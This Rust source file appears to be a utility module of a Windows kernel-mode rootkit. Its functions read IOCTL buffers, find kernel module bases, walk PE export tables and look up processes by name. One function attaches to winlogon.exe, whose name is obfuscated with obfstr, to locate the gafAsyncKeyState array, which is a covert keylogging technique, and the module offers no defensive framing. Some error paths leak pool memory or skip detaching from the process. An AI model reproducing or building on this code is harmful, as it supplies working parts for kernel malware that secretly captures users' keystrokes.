use {
    obfstr::obfstr,
    alloc::string::String,
    crate::process::Process,
    crate::includes::SystemModuleInformation,
    core::{ffi::CStr, ptr::null_mut},
    ntapi::{
        ntexapi::{SystemModuleInformation, SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION},
        ntzwapi::ZwQuerySystemInformation,
    },
    wdk_sys::{
        ntddk::{
            ExAllocatePool, ExFreePool, KeStackAttachProcess, KeUnstackDetachProcess, 
        }, 
        IRP, KAPC_STATE, NTSTATUS, NT_SUCCESS, STATUS_INVALID_PARAMETER, 
        _IO_STACK_LOCATION, _POOL_TYPE::NonPagedPool
    },
    winapi::{
        ctypes::c_void,
        um::winnt::{
            RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_EXPORT_DIRECTORY, 
            IMAGE_NT_HEADERS64, IMAGE_NT_SIGNATURE
        },
    },
};

#[cfg(not(test))]
extern crate wdk_panic;

#[cfg(not(test))]
use wdk_alloc::WDKAllocator;

#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WDKAllocator = WDKAllocator;

pub mod macros;
pub mod offsets;
pub mod uni;
pub mod ioctls;

/// Retrieves the input buffer from the given IO stack location.
///
/// # Parameters
/// - `stack`: A pointer to the `_IO_STACK_LOCATION` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the input buffer or an NTSTATUS error code.
///
pub unsafe fn get_input_buffer<T>(stack: *mut _IO_STACK_LOCATION) -> Result<*mut T, NTSTATUS> {
    let input_buffer = (*stack).Parameters.DeviceIoControl.Type3InputBuffer;
    if input_buffer.is_null() {
        log::error!("Type3InputBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(input_buffer as *mut T)
    }
}

/// Retrieves the output buffer from the given IRP.
///
/// # Parameters
/// - `irp`: A pointer to the `IRP` structure.
///
/// # Returns
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the output buffer or an NTSTATUS error code.
///
pub unsafe fn get_output_buffer<T>(irp: *mut IRP) -> Result<*mut T, NTSTATUS> {
    let output_buffer = (*irp).UserBuffer;
    if output_buffer.is_null() {
        log::error!("UserBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(output_buffer as *mut T)
    }
}

/// Gets the base address of a specified module.
///
/// # Parameters
/// - `module_name`: A string slice containing the name of the module.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the base address of the module, or None if the module is not found.
///
pub unsafe fn get_module_base_address(module_name: &str) -> Option<*mut c_void> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemModuleInformation, null_mut(), 0, &mut return_bytes);

    let info_module = ExAllocatePool(NonPagedPool, return_bytes as u64) as *mut SystemModuleInformation;

    if info_module.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    RtlZeroMemory(info_module as *mut c_void, return_bytes as usize);

    let status = ZwQuerySystemInformation(SystemModuleInformation,info_module as *mut c_void,return_bytes,&mut return_bytes);

    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation [2] Failed With Status: {status}");
        return None;
    }

    let module_count = (*info_module).modules_count;

    for i in 0..module_count as usize {
        let name = (*info_module).modules[i].image_name;
        let module_base = (*info_module).modules[i].image_base;
        if let Ok(name_str) = core::str::from_utf8(&name) {
            if name_str.contains(module_name) {
                return Some(module_base);
            }
        }
    }

    None
}

/// Gets the address of a specified function within a module.
///
/// # Parameters
/// - `function_name`: A string slice containing the name of the function.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_function_address(function_name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        log::error!("INVALID DOS SIGNATURE");
        return None;
    }

    let nt_header = (dll_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        log::error!("INVALID NT SIGNATURE");
        return None;
    }

    let export_directory = (dll_base as usize + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (dll_base as usize + (*export_directory).AddressOfNames as usize) as *const u32;
    let ordinals = (dll_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16;
    let addresss = (dll_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name = CStr::from_ptr((dll_base as usize + *names.offset(i) as usize) as *const i8).to_str().ok()?;
        let ordinal = *ordinals.offset(i);
        let address = (dll_base as usize + *addresss.offset(ordinal as isize) as usize) as *mut c_void;
        if name == function_name {
            return Some(address);
        }
    }
    
    None
}

/// Get the address of the `gafAsyncKeyState` array within a module in the context of a target process.
///
/// # Parameters
/// - `name`: A string slice containing the name `gafAsyncKeyState`.
/// - `dll_base`: A pointer to the base address of the DLL.
///
/// # Returns
/// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
///
pub unsafe fn get_function_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
    let mut apc_state: KAPC_STATE = core::mem::zeroed(); 
    let pid = match get_process_by_name(obfstr!("winlogon.exe")) {
        Some(p) => p,
        None => return None
    };

    let target = match Process::new(pid) {
        Some(p) => p,
        None => return None
    };

    KeStackAttachProcess(target.e_process, &mut apc_state);

    let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
    if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
        log::error!("INVALID DOS SIGNATURE");
        return None;
    }

    let nt_header = (dll_base as usize + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
    if (*nt_header).Signature != IMAGE_NT_SIGNATURE {
        log::error!("INVALID NT SIGNATURE");
        return None;
    }

    let export_directory = (dll_base as usize + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *const IMAGE_EXPORT_DIRECTORY;
    let names = (dll_base as usize + (*export_directory).AddressOfNames as usize) as *const u32;
    let ordinals = (dll_base as usize + (*export_directory).AddressOfNameOrdinals as usize) as *const u16;
    let addresss = (dll_base as usize + (*export_directory).AddressOfFunctions as usize) as *const u32;

    for i in 0..(*export_directory).NumberOfNames as isize {
        let name_module = CStr::from_ptr((dll_base as usize + *names.offset(i) as usize) as *const i8).to_str().ok()?;
        let ordinal = *ordinals.offset(i);
        let address = (dll_base as usize + *addresss.offset(ordinal as isize) as usize) as *mut c_void;
        if name_module == name {
            KeUnstackDetachProcess(&mut apc_state);
            return Some(address);
        }
    }

    KeUnstackDetachProcess(&mut apc_state);
    
    None
}

/// Retrieves the PID of a process by its name.
///
/// # Parameters
/// - `process_name`: A string slice containing the name of the process.
///
/// # Returns
/// - `Option<usize>`: An optional containing the PID of the process, or None if the process is not found.
///
pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let infor_process = ExAllocatePool(NonPagedPool, return_bytes as u64) as PSYSTEM_PROCESS_INFORMATION;
    if infor_process.is_null() {
        log::error!("ExAllocatePool Failed");
        return None;
    }

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        infor_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = infor_process;

    loop {
        if !(*process_info).ImageName.Buffer.is_null() {
            let image_name = core::slice::from_raw_parts(
                (*process_info).ImageName.Buffer,
                ((*process_info).ImageName.Length / 2) as usize,
            );
            let name = String::from_utf16_lossy(image_name);
            if name == process_name {
                let pid = (*process_info).UniqueProcessId as usize;
                ExFreePool(infor_process as *mut _);
                return Some(pid);
            }
        }

        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    ExFreePool(infor_process as _);
    None
}

/// Validates if the given address is within the kernel memory range.
///
/// # Parameters
/// - `addr`: A 64-bit unsigned integer representing the address to validate.
///
/// # Returns
/// - `bool`: True if the address is within the kernel memory range, False otherwise.
/// 
#[allow(dead_code)]
pub fn valid_kernel_memory(addr: u64) -> bool {
    addr > 0x8000000000000000 && addr < 0xFFFFFFFFFFFFFFFF
}